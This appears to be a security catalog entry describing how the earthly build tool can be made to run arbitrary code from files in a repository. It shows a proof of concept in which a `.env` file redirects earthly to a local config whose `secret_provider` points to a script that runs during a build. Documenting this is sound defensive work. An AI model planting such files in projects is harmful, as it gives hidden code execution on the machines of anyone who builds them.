---
title: earthly
tags:
  - cli
  - config-file
  - eval-sh
references: 
  - https://docs.earthly.dev/docs/earthfile
  - https://docs.earthly.dev/docs/earthly-config
files: [Earthfile, config.yml]
---

`earthly` is a CI/CD framework with a Docker-like syntax that can build programs, container images and other artifacts.

By default, `earthly` stores its configuration file in a standard path under the home directory of the currrent user: `~/.earthly/config.yml`.

When running `earthly` against a specific target, in addition to the `Earthfile`, it reads three files in the current directory: `.env` (self-explanatory), `.arg` (build arguments) and `.secret` (build secrets).

By using `.env` combined with the `$EARTHLY_CONFIG` environment variable, we can tell `earthly` to load a configuration file in the current directory.

From there, we can configure a custom `secret_provider` script in our configuration file and request a secret with the `--secret` argument in a build step of our `Earthfile`. This will cause an invocation of our configured secret provider during the build which gives us unrestricted code execution.

#### .env
```ini
EARTHLY_CONFIG=config.yml
```

#### config.yml
```yml
global:
  secret_provider: ./pwn.sh
```

#### pwn.sh
```sh
#!/bin/sh
echo pwned
```

#### Earthfile
```dockerfile
# [...]
some_target:
    RUN --secret=some_secret id
# [...]
```